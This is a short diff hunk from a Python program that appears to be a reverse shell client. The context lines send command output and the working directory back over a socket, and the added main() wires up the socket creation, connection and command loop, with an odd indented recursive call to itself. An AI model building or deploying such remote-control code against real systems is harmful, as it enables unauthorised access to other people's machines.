@@ -36,3 +36,9 @@ def commands():
                 s.send(str.encode(string_out + str(os.getcwd()) + '> '))
                 print(string_out)
                 s.close()
+def main():
+    socketMake()
+    socketConnect()
+    commands()
+
+    main()
